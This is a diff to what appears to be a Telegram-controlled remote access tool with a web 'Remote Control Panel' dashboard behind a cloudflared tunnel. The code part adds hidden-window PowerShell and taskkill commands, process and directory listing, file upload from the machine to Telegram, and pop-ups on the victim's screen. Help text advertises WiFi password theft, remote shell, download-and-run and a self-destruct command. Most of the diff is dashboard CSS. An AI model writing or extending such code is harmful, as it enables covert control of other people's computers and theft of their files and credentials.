@@ -453,6 +453,13 @@ def _handle_telegram_command(text: str):
             "/wifi - WiFi passwords\n"
             "/shell &lt;cmd&gt; - Run command\n"
             "/download &lt;url&gt; - Download+run\n"
+            "/proc - List processes\n"
+            "/kill &lt;pid&gt; - Kill process\n"
+            "/upload &lt;path&gt; - Upload file\n"
+            "/cd &lt;path&gt; - Change directory\n"
+            "/ls - List current directory\n"
+            "/volume &lt;0-100&gt; - Set volume\n"
+            "/notify &lt;text&gt; - Show notification\n"
             "/reboot - Reboot machine\n"
             "/shutdown - Shutdown machine\n"
             "/panic - Self destruct\n"
@@ -596,6 +603,89 @@ def _handle_telegram_command(text: str):
 
     elif cmd == "/url":
         _send_telegram(f"Dashboard: {CLOUDFLARED_PUBLIC_URL}")
+
+    elif cmd == "/proc":
+        try:
+            result = subprocess.run(['powershell', '-Command',
+                'Get-Process | Sort-Object -Property WorkingSet64 -Descending | Select-Object -First 30 Id, ProcessName, @{N="MemMB";E={[math]::Round($_.WorkingSet64/1MB)}} | Format-Table -HideTableHeaders'],
+                capture_output=True, text=True, timeout=20, creationflags=_NO_WINDOW)
+            procs = result.stdout.strip()[:4000] or 'No processes'
+            _send_telegram(f"<b>Top Processes</b>\n<pre>{procs}</pre>")
+        except:
+            _send_telegram("Process list failed")
+
+    elif cmd == "/kill":
+        if not args:
+            _send_telegram("Usage: /kill <pid>")
+            return
+        try:
+            pid = int(args.strip())
+            subprocess.run(['taskkill', '/pid', str(pid), '/f'], creationflags=_NO_WINDOW, capture_output=True)
+            _send_telegram(f"Killed PID {pid}")
+        except:
+            _send_telegram(f"Kill failed: {args}")
+
+    elif cmd == "/upload":
+        if not args:
+            _send_telegram("Usage: /upload <path>")
+            return
+        try:
+            path = args.strip().strip('"').strip("'")
+            if os.path.exists(path) and os.path.isfile(path):
+                _send_telegram_file(path, os.path.basename(path))
+            else:
+                _send_telegram(f"File not found: {path}")
+        except:
+            _send_telegram("Upload failed")
+
+    elif cmd == "/cd":
+        if not args:
+            _send_telegram(f"Current: {os.getcwd()}")
+            return
+        try:
+            os.chdir(args.strip().strip('"').strip("'"))
+            _send_telegram(f"Changed to: {os.getcwd()}")
+        except:
+            _send_telegram(f"Failed to change directory")
+
+    elif cmd == "/ls":
+        try:
+            entries = os.listdir(os.getcwd())
+            dirs = [e for e in entries if os.path.isdir(os.path.join(os.getcwd(), e))]
+            files = [e for e in entries if os.path.isfile(os.path.join(os.getcwd(), e))]
+            listing = f"<b>{os.getcwd()}</b>\n"
+            if dirs:
+                listing += "<b>Dirs:</b> " + "  ".join(dirs[:30]) + "\n"
+            if files:
+                listing += "<b>Files:</b> " + "  ".join(files[:30])
+            _send_telegram(listing[:4000] or "Empty directory")
+        except:
+            _send_telegram("List failed")
+
+    elif cmd == "/volume":
+        if not args:
+            _send_telegram("Usage: /volume <0-100>")
+            return
+        try:
+            vol = max(0, min(100, int(args.strip())))
+            subprocess.run(['powershell', '-Command',
+                f'$wshShell = New-Object -ComObject WScript.Shell; 1..50 | % {{$wshShell.SendKeys([char]174)}}; 1..{vol // 2} | % {{$wshShell.SendKeys([char]175)}}'],
+                capture_output=True, timeout=15, creationflags=_NO_WINDOW)
+            _send_telegram(f"Volume set to {vol}%")
+        except:
+            _send_telegram("Volume change failed")
+
+    elif cmd == "/notify":
+        if not args:
+            _send_telegram("Usage: /notify <text>")
+            return
+        try:
+            subprocess.run(['powershell', '-Command',
+                f'[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms"); [System.Windows.Forms.MessageBox]::Show("{args.strip()}", "System", "OK", "Information")'],
+                creationflags=_NO_WINDOW, close_fds=True)
+            _send_telegram(f"Notification shown: {args.strip()}")
+        except:
+            _send_telegram("Notification failed")
 
     else:
         _send_telegram(f"Unknown command: {cmd}\nType /help for commands")
@@ -1067,374 +1157,495 @@ DASHBOARD_HTML = r'''
     <title>IGR</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Courier New', monospace;
-            background: #0a0a0a;
-            color: #c084fc;
-            overflow-x: hidden;
-            font-size: 16px;
+        :root {
+            --purple: #9b5cff;
+            --purple-dim: #7c3aed;
+            --purple-glow: rgba(155, 92, 255, 0.35);
+            --purple-glass: rgba(155, 92, 255, 0.08);
+            --bg-deep: #06060c;
+            --bg-card: rgba(12, 10, 22, 0.75);
+            --bg-card-solid: #0c0a16;
+            --border-glass: rgba(155, 92, 255, 0.18);
+            --border-hover: rgba(155, 92, 255, 0.45);
+            --text-primary: #e2d6f9;
+            --text-dim: #8b7faa;
+            --text-muted: #5a4f78;
+            --red: #ff4466;
+            --red-glow: rgba(255, 68, 102, 0.3);
+            --green: #44ff88;
+            --green-glow: rgba(68, 255, 136, 0.25);
+            --radius: 18px;
+            --radius-sm: 12px;
+            --radius-xs: 8px;
+            --shadow: 0 8px 32px rgba(0,0,0,0.5);
+            --glow: 0 0 20px var(--purple-glow);
         }
-        
-        /* Login Screen */
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg-deep);
+            color: var(--text-primary);
+            overflow-x: hidden;
+            font-size: 14px;
+            min-height: 100vh;
+        }
+        body::before {
+            content: '';
+            position: fixed; inset: 0;
+            background:
+                radial-gradient(ellipse 80% 50% at 20% 40%, rgba(155,92,255,0.06), transparent),
+                radial-gradient(ellipse 60% 40% at 80% 60%, rgba(155,92,255,0.04), transparent),
+                linear-gradient(180deg, rgba(6,6,12,0) 0%, rgba(6,6,12,0.5) 100%);
+            pointer-events: none; z-index: 0;
+        }
+
+        /* Login */
         .login-screen {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100vw; height: 100vh;
-            background: #0a0a0a;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            position: fixed; inset: 0;
+            background: var(--bg-deep);
+            display: flex; align-items: center; justify-content: center;
             z-index: 10000;
         }
+        .login-screen::before {
+            content: '';
+            position: absolute; inset: 0;
+            background: radial-gradient(circle at 50% 30%, rgba(155,92,255,0.12), transparent 70%);
+            pointer-events: none;
+        }
         .login-box {
-            background: #0f0a1a;
-            border: 1px solid rgba(124, 58, 237, 0.3);
-            border-radius: 12px;
-            padding: 40px;
+            background: var(--bg-card);
+            backdrop-filter: blur(24px);
+            border: 1px solid var(--border-glass);
+            border-radius: 28px;
+            padding: 48px 40px;
             text-align: center;
-            box-shadow: 0 0 60px rgba(124, 58, 237, 0.1);
+            box-shadow: var(--shadow), 0 0 80px rgba(155,92,255,0.08);
+            position: relative; z-index: 1;
+            animation: fadeUp 0.6s ease;
         }
         .login-title {
-            font-size: 42px;
-            color: #7c3aed;
-            text-shadow: 0 0 15px rgba(124, 58, 237, 0.5);
-            margin-bottom: 40px;
+            font-size: 48px; font-weight: 800;
+            background: linear-gradient(135deg, var(--purple), #c084fc);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            margin-bottom: 12px; letter-spacing: -1px;
+        }
+        .login-subtitle {
+            color: var(--text-dim); font-size: 13px; margin-bottom: 36px;
+            text-transform: uppercase; letter-spacing: 3px;
         }
         .login-input {
-            width: 300px;
-            padding: 14px 18px;
-            background: #0a0a0a;
-            border: 1px solid rgba(124, 58, 237, 0.3);
-            border-radius: 6px;
-            color: #c084fc;
-            font-family: 'Courier New', monospace;
-            font-size: 16px;
-            margin-bottom: 25px;
+            width: 320px; padding: 14px 20px;
+            background: rgba(6,6,12,0.6);
+            border: 1px solid var(--border-glass);
+            border-radius: var(--radius-sm);
+            color: var(--text-primary);
+            font-size: 15px; margin-bottom: 20px;
+            transition: all 0.3s;
         }
+        .login-input:focus { outline: none; border-color: var(--purple); box-shadow: 0 0 16px var(--purple-glow); }
         .login-btn {
-            padding: 14px 50px;
-            background: #7c3aed;
-            color: #000;
-            border: none;
-            border-radius: 4px;
-            font-family: 'Courier New', monospace;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
+            padding: 14px 56px;
+            background: linear-gradient(135deg, var(--purple), #a855f7);
+            color: #fff; border: none;
+            border-radius: var(--radius-sm);
+            font-size: 15px; font-weight: 700;
+            cursor: pointer; letter-spacing: 1px;
+            transition: all 0.3s;
+            box-shadow: 0 4px 20px var(--purple-glow);
         }
-        .login-btn:hover { box-shadow: 0 0 20px rgba(124, 58, 237, 0.4); }
-        .login-error { color: #ef4444; margin-top: 20px; font-size: 14px; display: none; }
-        
-        /* Main Layout */
-        .app-container { display: none; }
+        .login-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 30px var(--purple-glow); }
+        .login-error { color: var(--red); margin-top: 16px; font-size: 13px; display: none; }
+
+        /* Layout */
+        .app-container { display: none; position: relative; z-index: 1; }
         .app-container.active { display: flex; }
-        
+
         /* Sidebar */
         .sidebar {
-            width: 260px;
-            min-width: 260px;
-            background: #0a0a0f;
-            border-right: 1px solid rgba(124, 58, 237, 0.2);
-            height: 100vh;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            transition: all 0.3s ease;
+            width: 240px; min-width: 240px;
+            background: rgba(8,6,16,0.92);
+            backdrop-filter: blur(20px);
+            border-right: 1px solid var(--border-glass);
+            height: 100vh; overflow-y: auto;
+            display: flex; flex-direction: column;
+            transition: all 0.35s cubic-bezier(0.4,0,0.2,1);
         }
-        .sidebar.collapsed {
-            width: 60px;
-            min-width: 60px;
-        }
-        .sidebar.collapsed .nav-text { display: none; }
-        .sidebar.collapsed .nav-item { justify-content: center; padding: 18px; }
-        .sidebar.collapsed .sidebar-logo { display: none; }
-        .sidebar.collapsed .sidebar-header { justify-content: center; padding: 18px; }
+        .sidebar.collapsed { width: 64px; min-width: 64px; }
+        .sidebar.collapsed .nav-text,
+        .sidebar.collapsed .sidebar-logo,
+        .sidebar.collapsed .sidebar-status { display: none; }
+        .sidebar.collapsed .nav-item { justify-content: center; padding: 14px 0; }
+        .sidebar.collapsed .sidebar-header { justify-content: center; padding: 16px 0; }
         .sidebar-header {
-            padding: 25px;
-            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
-            text-align: center;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
+            padding: 20px 18px;
+            border-bottom: 1px solid var(--border-glass);
+            display: flex; align-items: center; justify-content: space-between;
         }
         .sidebar-logo {
-            font-size: 28px;
-            font-weight: bold;
-            color: #7c3aed;
-            text-shadow: 0 0 12px rgba(124, 58, 237, 0.4);
+            font-size: 22px; font-weight: 800;
+            background: linear-gradient(135deg, var(--purple), #c084fc);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
         }
         .sidebar-toggle {
-            background: none;
-            border: none;
-            color: #7c3aed;
-            font-size: 20px;
-            cursor: pointer;
-            padding: 5px;
+            background: var(--purple-glass); border: 1px solid var(--border-glass);
+            color: var(--purple); font-size: 14px;
+            cursor: pointer; padding: 4px 8px;
+            border-radius: var(--radius-xs);
+            transition: all 0.3s;
         }
+        .sidebar-toggle:hover { background: var(--purple-glow); }
         .sidebar.collapsed .sidebar-toggle { margin: 0 auto; }
-        .sidebar-nav { flex: 1; padding: 15px 0; }
+
+        /* Sidebar Status */
+        .sidebar-status {
+            padding: 12px 18px;
+            border-bottom: 1px solid var(--border-glass);
+            display: flex; flex-direction: column; gap: 8px;
+        }
+        .status-row {
+            display: flex; align-items: center; gap: 8px;
+            font-size: 11px; color: var(--text-dim);
+        }
+        .status-dot {
+            width: 7px; height: 7px; border-radius: 50%;
+            background: var(--green);
+            box-shadow: 0 0 8px var(--green-glow);
+            animation: pulse 2s infinite;
+        }
+        .status-dot.offline { background: var(--red); box-shadow: 0 0 8px var(--red-glow); animation: none; }
+
+        .sidebar-nav { flex: 1; padding: 8px 0; overflow-y: auto; }
         .nav-item {
-            padding: 18px 25px;
-            cursor: pointer;
-            border-left: 4px solid transparent;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            font-size: 15px;
+            padding: 11px 18px; cursor: pointer;
+            border-left: 3px solid transparent;
+            transition: all 0.25s;
+            display: flex; align-items: center; gap: 12px;
+            font-size: 13px; color: var(--text-dim);
+            position: relative;
         }
-        .nav-item:hover { background: rgba(124, 58, 237, 0.08); border-left-color: #7c3aed; }
-        .nav-item.active { background: rgba(124, 58, 237, 0.15); border-left-color: #7c3aed; color: #fff; }
-        .nav-icon { 
-            font-size: 18px; 
-            width: 28px; 
-            text-align: center;
-            font-weight: bold;
+        .nav-item:hover {
+            background: var(--purple-glass);
+            border-left-color: var(--purple-dim);
+            color: var(--text-primary);
         }
-        
+        .nav-item.active {
+            background: linear-gradient(90deg, var(--purple-glass), transparent);
+            border-left-color: var(--purple);
+            color: #fff;
+        }
+        .nav-item.active::after {
+            content: '';
+            position: absolute; right: 0; top: 50%; transform: translateY(-50%);
+            width: 3px; height: 60%; border-radius: 3px;
+            background: var(--purple);
+            box-shadow: 0 0 10px var(--purple-glow);
+        }
+        .nav-icon {
+            font-size: 16px; width: 24px;
+            text-align: center; font-weight: 700;
+            color: var(--purple);
+        }
+
         /* Main Content */
         .main-content {
-            flex: 1;
-            height: 100vh;
-            overflow-y: auto;
-            padding: 25px;
-            display: flex;
-            flex-direction: column;
+            flex: 1; height: 100vh; overflow-y: auto;
+            padding: 28px;
+            display: flex; flex-direction: column;
         }
-        .page { display: none; flex: 1; }
+        .page { display: none; flex: 1; animation: fadeUp 0.3s ease; }
         .page.active { display: flex; flex-direction: column; }
-        .page-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .page-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
         .page-grid .section { margin-bottom: 0; }
-        
+
+        /* Command Bar */
+        .command-bar {
+            display: flex; gap: 10px; margin-bottom: 20px;
+            align-items: center;
+        }
+        .command-bar input {
+            flex: 1; margin-bottom: 0;
+            background: rgba(6,6,12,0.5);
+            border: 1px solid var(--border-glass);
+            border-radius: var(--radius);
+            padding: 12px 20px;
+            font-size: 13px; color: var(--text-primary);
+            backdrop-filter: blur(8px);
+        }
+        .command-bar input:focus { border-color: var(--purple); box-shadow: 0 0 12px var(--purple-glow); }
+
         /* Info Cards */
         .info-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 12px; margin-bottom: 24px;
         }
         .info-card {
-            background: rgba(15, 10, 26, 0.8);
-            border: 1px solid rgba(124, 58, 237, 0.2);
-            border-radius: 10px;
-            padding: 20px;
-            text-align: center;
+            background: var(--bg-card);
+            backdrop-filter: blur(16px);
+            border: 1px solid var(--border-glass);
+            border-radius: var(--radius);
+            padding: 18px; text-align: center;
+            transition: all 0.3s;
+            position: relative; overflow: hidden;
         }
-        .info-label { font-size: 13px; color: #888; text-transform: uppercase; margin-bottom: 10px; }
-        .info-value { font-size: 22px; color: #7c3aed; font-weight: bold; }
-        
+        .info-card::before {
+            content: '';
+            position: absolute; top: 0; left: 0; right: 0; height: 2px;
+            background: linear-gradient(90deg, transparent, var(--purple), transparent);
+            opacity: 0; transition: opacity 0.3s;
+        }
+        .info-card:hover::before { opacity: 1; }
+        .info-card:hover { border-color: var(--border-hover); transform: translateY(-2px); box-shadow: var(--glow); }
+        .info-label { font-size: 10px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 8px; }
+        .info-value { font-size: 20px; font-weight: 700; color: var(--purple); }
+
         /* Section */
         .section {
-            background: rgba(15, 10, 26, 0.8);
-            border: 1px solid rgba(124, 58, 237, 0.2);
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 25px;
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            min-height: 0;
+            background: var(--bg-card);
+            backdrop-filter: blur(16px);
+            border: 1px solid var(--border-glass);
+            border-radius: var(--radius);
+            padding: 20px; margin-bottom: 16px;
+            flex: 1; display: flex; flex-direction: column;
+            min-height: 0; transition: all 0.3s;
         }
+        .section:hover { border-color: rgba(155,92,255,0.25); }
         .section-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 10px;
-            margin-bottom: 20px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid rgba(124, 58, 237, 0.1);
+            display: flex; justify-content: space-between; align-items: center;
+            flex-wrap: wrap; gap: 10px;
+            margin-bottom: 16px; padding-bottom: 12px;
+            border-bottom: 1px solid var(--border-glass);
         }
-        .section-title { font-size: 16px; font-weight: 600; color: #7c3aed; text-transform: uppercase; letter-spacing: 1px; }
-        .section-header > div { display: flex; gap: 8px; flex-wrap: wrap; }
-        
+        .section-title {
+            font-size: 13px; font-weight: 700;
+            color: var(--purple); text-transform: uppercase;
+            letter-spacing: 1.5px;
+        }
+        .section-header > div { display: flex; gap: 6px; flex-wrap: wrap; }
+
         /* Buttons */
         .btn {
-            background: transparent;
-            color: #7c3aed;
-            border: 1px solid rgba(124, 58, 237, 0.4);
-            padding: 10px 20px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-family: 'Courier New', monospace;
-            font-size: 15px;
-            font-weight: bold;
-            transition: all 0.3s;
-            margin: 5px;
+            background: var(--purple-glass);
+            color: var(--purple);
+            border: 1px solid var(--border-glass);
+            padding: 9px 18px;
+            border-radius: var(--radius-sm);
+            cursor: pointer; font-size: 13px;
+            font-weight: 600; transition: all 0.3s;
+            margin: 3px; letter-spacing: 0.5px;
         }
-        .btn:hover { background: rgba(124, 58, 237, 0.15); color: #7c3aed; border-color: #7c3aed; box-shadow: 0 0 12px rgba(124, 58, 237, 0.2); }
-        .btn.active { background: #7c3aed; color: #fff; }
-        .btn.danger { border-color: #ef4444; color: #ef4444; }
-        .btn.danger:hover { background: #ef4444; color: #000; }
-        .btn.small { padding: 8px 16px; font-size: 13px; }
-        
+        .btn:hover {
+            background: var(--purple-glow);
+            color: #fff; border-color: var(--purple);
+            box-shadow: 0 0 16px var(--purple-glow);
+            transform: translateY(-1px);
+        }
+        .btn.active {
+            background: linear-gradient(135deg, var(--purple), #a855f7);
+            color: #fff; border-color: transparent;
+            box-shadow: 0 4px 16px var(--purple-glow);
+        }
+        .btn.danger { border-color: rgba(255,68,102,0.3); color: var(--red); background: rgba(255,68,102,0.06); }
+        .btn.danger:hover { background: var(--red); color: #fff; border-color: var(--red); box-shadow: 0 0 16px var(--red-glow); }
+        .btn.small { padding: 6px 12px; font-size: 11px; border-radius: var(--radius-xs); }
+        .btn.success { border-color: rgba(68,255,136,0.3); color: var(--green); background: rgba(68,255,136,0.06); }
+        .btn.success:hover { background: var(--green); color: #000; box-shadow: 0 0 16px var(--green-glow); }
+
         /* Inputs */
         input, select, textarea {
-            background: rgba(10, 10, 10, 0.8);
-            border: 1px solid rgba(124, 58, 237, 0.25);
-            border-radius: 6px;
+            background: rgba(6,6,12,0.6);
+            border: 1px solid var(--border-glass);
+            border-radius: var(--radius-sm);
             padding: 10px 14px;
-            color: #c084fc;
-            font-family: 'Courier New', monospace;
-            font-size: 15px;
-            width: 100%;
-            margin-bottom: 12px;
+            color: var(--text-primary);
+            font-size: 13px; width: 100%;
+            margin-bottom: 10px; transition: all 0.3s;
         }
-        input:focus, select:focus { outline: none; border-color: #7c3aed; box-shadow: 0 0 8px rgba(124, 58, 237, 0.15); }
-        
+        input:focus, select:focus { outline: none; border-color: var(--purple); box-shadow: 0 0 12px var(--purple-glow); }
+        input::placeholder { color: var(--text-muted); }
+
         /* Log Box */
         .log-box {
-            background: rgba(5, 5, 5, 0.8);
-            border: 1px solid rgba(124, 58, 237, 0.15);
-            border-radius: 8px;
-            padding: 15px;
-            min-height: 200px;
-            flex: 1;
-            overflow-y: auto;
-            font-size: 14px;
-            white-space: pre-wrap;
-            word-wrap: break-word;
+            background: rgba(4,4,8,0.8);
+            border: 1px solid var(--border-glass);
+            border-radius: var(--radius-sm);
+            padding: 14px; min-height: 180px;
+            flex: 1; overflow-y: auto;
+            font-size: 12px; font-family: 'Cascadia Code', 'Fira Code', monospace;
+            white-space: pre-wrap; word-wrap: break-word;
+            color: var(--text-dim); line-height: 1.6;
         }
-        
+
         /* Stream Box */
         .stream-box {
-            background: rgba(5, 5, 5, 0.8);
-            border: 1px solid rgba(124, 58, 237, 0.15);
-            border-radius: 10px;
-            min-height: 400px;
-            flex: 1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            overflow: hidden;
+            background: rgba(4,4,8,0.9);
+            border: 1px solid var(--border-glass);
+            border-radius: var(--radius);
+            min-height: 380px; flex: 1;
+            display: flex; align-items: center; justify-content: center;
+            position: relative; overflow: hidden;
+            transition: all 0.3s;
         }
         .stream-box img { max-width: 100%; max-height: 100%; object-fit: contain; }
         .stream-box.fullscreen {
-            position: fixed; top: 0; left: 0;
+            position: fixed; inset: 0;
             width: 100vw; height: 100vh;
             z-index: 9999; border: none; border-radius: 0;
         }
         .stream-badge {
-            position: absolute; top: 15px; right: 15px;
-            background: rgba(168, 85, 247, 0.9);
-            color: #000;
-            padding: 8px 16px;
-            border-radius: 4px;
-            font-size: 13px;
-            font-weight: bold;
-            z-index: 10;
+            position: absolute; top: 12px; right: 12px;
+            background: linear-gradient(135deg, var(--purple), #a855f7);
+            color: #fff; padding: 5px 14px;
+            border-radius: 20px; font-size: 11px;
+            font-weight: 700; z-index: 10;
+            box-shadow: 0 2px 12px var(--purple-glow);
+            letter-spacing: 1px;
         }
         .fullscreen-btn {
-            position: absolute; top: 15px; left: 15px;
-            background: rgba(168, 85, 247, 0.9);
-            color: #000;
-            border: none;
-            padding: 10px 16px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: bold;
-            z-index: 10;
+            position: absolute; top: 12px; left: 12px;
+            background: rgba(6,6,12,0.7);
+            backdrop-filter: blur(8px);
+            color: var(--text-primary);
+            border: 1px solid var(--border-glass);
+            padding: 8px 14px; border-radius: var(--radius-sm);
+            cursor: pointer; font-size: 13px;
+            z-index: 10; transition: all 0.3s;
         }
-        
+        .fullscreen-btn:hover { border-color: var(--purple); box-shadow: var(--glow); }
+
         /* File Browser */
-        .file-path-bar { display: flex; gap: 15px; margin-bottom: 20px; }
+        .file-path-bar { display: flex; gap: 10px; margin-bottom: 16px; }
         .file-path-bar input { flex: 1; }
         .file-list {
-            background: rgba(5, 5, 5, 0.8);
-            border: 1px solid rgba(124, 58, 237, 0.15);
-            border-radius: 8px;
-            flex: 1;
-            overflow-y: auto;
+            background: rgba(4,4,8,0.8);
+            border: 1px solid var(--border-glass);
+            border-radius: var(--radius-sm);
+            flex: 1; overflow-y: auto;
         }
         .file-item {
-            padding: 14px 20px;
-            border-bottom: 1px solid rgba(124, 58, 237, 0.1);
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 12px;
+            padding: 11px 16px;
+            border-bottom: 1px solid var(--border-glass);
+            cursor: pointer; display: flex;
+            align-items: center; gap: 10px;
+            font-size: 13px; transition: all 0.2s;
         }
-        .file-item:hover { background: rgba(124, 58, 237, 0.08); }
+        .file-item:hover { background: var(--purple-glass); }
         .file-item:last-child { border-bottom: none; }
-        .file-icon { color: #7c3aed; }
-        
+        .file-icon { color: var(--purple); font-weight: 700; }
+
+        /* Animations */
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        @keyframes glowPulse {
+            0%, 100% { box-shadow: 0 0 8px var(--purple-glow); }
+            50% { box-shadow: 0 0 24px var(--purple-glow); }
+        }
+
+        /* Volume Slider */
+        .volume-slider {
+            -webkit-appearance: none; appearance: none;
+            width: 100%; height: 6px;
+            background: rgba(155,92,255,0.15);
+            border-radius: 3px; outline: none;
+            border: none; margin: 8px 0;
+        }
+        .volume-slider::-webkit-slider-thumb {
+            -webkit-appearance: none; appearance: none;
+            width: 18px; height: 18px;
+            border-radius: 50%;
+            background: var(--purple);
+            cursor: pointer;
+            box-shadow: 0 0 10px var(--purple-glow);
+        }
+
+        /* Process table */
+        .proc-table { width: 100%; border-collapse: collapse; font-size: 12px; }
+        .proc-table th { text-align: left; padding: 8px 10px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; font-size: 10px; border-bottom: 1px solid var(--border-glass); }
+        .proc-table td { padding: 7px 10px; border-bottom: 1px solid rgba(155,92,255,0.06); color: var(--text-dim); }
+        .proc-table tr:hover td { background: var(--purple-glass); color: var(--text-primary); }
+
         /* Mobile */
         @media (max-width: 768px) {
             .sidebar {
                 position: fixed; bottom: 0; left: 0; right: 0; top: auto;
                 width: 100% !important; min-width: unset !important;
-                height: 56px; flex-direction: row; z-index: 1000;
-                border-top: 1px solid rgba(124, 58, 237, 0.2);
+                height: 58px; flex-direction: row; z-index: 1000;
+                border-top: 1px solid var(--border-glass);
                 border-right: none;
                 overflow-x: auto; overflow-y: hidden;
             }
             .sidebar.collapsed { width: 100% !important; min-width: unset !important; }
-            .sidebar-header, .sidebar-logo, .sidebar-toggle { display: none; }
+            .sidebar-header, .sidebar-logo, .sidebar-toggle, .sidebar-status { display: none; }
             .nav-item {
                 flex: 1; min-width: 0; padding: 8px 4px;
-                justify-content: center; font-size: 10px; flex-direction: column; gap: 2px;
+                justify-content: center; font-size: 10px;
+                flex-direction: column; gap: 2px;
+                border-left: none;
             }
-            .nav-text { display: block; font-size: 9px; }
+            .nav-text { display: block; font-size: 8px; }
             .nav-icon { font-size: 16px; width: auto; }
-            .main-content { padding: 12px; padding-bottom: 68px; margin-left: 0 !important; }
-            .info-grid { grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 12px; }
-            .info-card { padding: 10px; }
-            .info-label { font-size: 9px; margin-bottom: 3px; }
-            .info-value { font-size: 14px; }
-            .section { padding: 12px; margin-bottom: 10px; }
+            .nav-item.active::after { display: none; }
+            .main-content { padding: 14px; padding-bottom: 70px; }
+            .info-grid { grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 14px; }
+            .info-card { padding: 12px; }
+            .info-label { font-size: 8px; }
+            .info-value { font-size: 15px; }
+            .section { padding: 14px; margin-bottom: 10px; }
             .page-grid { grid-template-columns: 1fr; }
-            .section-header { flex-wrap: wrap; gap: 8px; margin-bottom: 10px; padding-bottom: 8px; }
-            .section-title { font-size: 14px; }
-            .btn { padding: 10px 16px; font-size: 13px; min-height: 40px; }
-            .btn.small { padding: 8px 12px; font-size: 11px; min-height: 34px; }
-            input, select, textarea { padding: 10px 12px; font-size: 14px; min-height: 40px; }
-            .log-box { min-height: 120px; font-size: 12px; padding: 10px; }
+            .section-header { flex-wrap: wrap; gap: 8px; }
+            .section-title { font-size: 12px; }
+            .btn { padding: 10px 14px; font-size: 12px; min-height: 40px; }
+            .btn.small { padding: 7px 10px; font-size: 10px; min-height: 34px; }
+            input, select, textarea { padding: 10px 12px; font-size: 13px; min-height: 40px; }
+            .log-box { min-height: 120px; font-size: 11px; }
             .stream-box { min-height: 220px; }
-            .stream-badge { padding: 4px 10px; font-size: 10px; top: 8px; right: 8px; }
-            .fullscreen-btn { padding: 8px 12px; font-size: 14px; top: 8px; left: 8px; }
-            .file-item { padding: 12px; font-size: 13px; }
-            .file-path-bar { gap: 6px; margin-bottom: 10px; flex-wrap: wrap; }
-            .login-box { padding: 30px; width: 92%; max-width: 340px; }
-            .login-title { font-size: 30px; }
-            .login-input { font-size: 14px; padding: 12px; width: 100%; }
+            .login-box { padding: 28px; width: 92%; max-width: 340px; }
+            .login-title { font-size: 36px; }
+            .login-input { width: 100%; font-size: 14px; padding: 12px; }
             .login-btn { font-size: 14px; padding: 12px; }
+            .command-bar { flex-wrap: wrap; }
         }
         @media (max-width: 480px) {
-            .sidebar { height: 50px; }
+            .sidebar { height: 52px; }
             .nav-item { padding: 6px 2px; }
             .nav-icon { font-size: 14px; }
-            .nav-text { font-size: 8px; }
-            .main-content { padding: 8px; padding-bottom: 60px; }
+            .nav-text { font-size: 7px; }
+            .main-content { padding: 10px; padding-bottom: 64px; }
             .info-grid { grid-template-columns: 1fr 1fr; gap: 6px; }
-            .info-card { padding: 8px; }
+            .info-card { padding: 10px; }
             .info-value { font-size: 13px; }
-            .section { padding: 10px; }
-            .section-title { font-size: 13px; }
-            .btn { padding: 9px 12px; font-size: 12px; }
-            input, select, textarea { padding: 9px 10px; font-size: 13px; }
-            .log-box { min-height: 100px; font-size: 11px; }
+            .section { padding: 12px; }
+            .section-title { font-size: 11px; }
+            .btn { padding: 8px 12px; font-size: 11px; }
+            input, select, textarea { padding: 8px 10px; font-size: 12px; }
+            .log-box { min-height: 100px; font-size: 10px; }
             .stream-box { min-height: 180px; }
             .login-box { padding: 20px; }
-            .login-title { font-size: 24px; }
+            .login-title { font-size: 28px; }
         }
-        
+
         /* Scrollbar */
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: #0a0a0f; }
-        ::-webkit-scrollbar-thumb { background: rgba(124, 58, 237, 0.3); border-radius: 4px; }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: rgba(155,92,255,0.2); border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: rgba(155,92,255,0.4); }
     </style>
 </head>
 <body>
     <!-- Login Screen -->
     <div class="login-screen" id="loginScreen">
         <div class="login-box">
-            <div class="login-title">[IGR]</div>
-            <input type="password" class="login-input" id="passwordInput" placeholder="Enter password" onkeypress="if(event.key==='Enter')attemptLogin()">
+            <div class="login-title">IGR</div>
+            <div class="login-subtitle">Remote Control Panel</div>
+            <input type="password" class="login-input" id="passwordInput" placeholder="Enter access key" onkeypress="if(event.key==='Enter')attemptLogin()">
             <br>
